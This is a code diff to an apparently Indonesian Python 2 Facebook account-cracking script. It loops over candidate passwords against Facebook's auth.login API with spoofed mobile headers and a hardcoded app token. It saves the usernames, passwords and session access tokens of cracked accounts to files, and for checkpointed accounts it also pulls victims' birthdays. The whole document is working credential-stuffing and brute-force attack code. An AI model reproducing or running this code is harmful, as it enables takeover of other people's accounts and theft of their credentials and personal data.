@@ -771,11 +771,11 @@ class ngentod:
         except IOError:
         	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
         global ok,cp,loop
-        for pw in manual:
+        for pw in zona:
             pw = pw.lower()
             ses = requests.Session()
             header = {"user-agent": ua,
-            "x-fb-connection-bandwidth": str(random.randint(20000000.0,30000000.0)),
+            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
             "x-fb-sim-hni": str(random.randint(20000,40000)),
             "x-fb-net-hni": str(random.randint(20000,40000)),
             "x-fb-connection-quality": "EXCELLENT",
@@ -785,14 +785,14 @@ class ngentod:
             bapi = "https://b-api.facebook.com/method/auth.login"
             response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
             if response.status_code != 200:
-            	print ("\r\033[0;91m• IP terblokir. hidupkan mode pesawat 2 detik"),
+            	loop +=1
+            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                 sys.stdout.flush()
-                loop +=1
-                b_api(self, user, manual)
+                b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
                 print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
-                ok.append('%s ◊ %s ◊ %s'%(user,pw,response.json()['access_token']))
-                open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
+                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                 break
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
@@ -800,11 +800,10 @@ class ngentod:
                     romz = open('token.txt').read()
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
-                    month = bulan12[month]
+                    month = bulan1[month]
                     print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
-#                    cek_log(user,pw,opsi_)
-                    cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
-                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"% (user,pw,day,month,year))
+                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
@@ -812,13 +811,12 @@ class ngentod:
                     year  = ''
                 except: pass
                 print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
-#                cek_log(user,pw,opsi_)
-                cp.append('%s ◊ %s'%(user,pw))
-                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
+                cp.append('%s ◊ %s' % (user,pw))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                 break
                 continue
         loop += 1
-        print('\r\x1b[1;95m•\x1b[1;96m [crack] %s/%s [OK:%s]-[CP:%s]'%(loop,len(self.id),len(ok),len(cp))),
+        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
    # MBASIC
     def basic(self, user, manual):
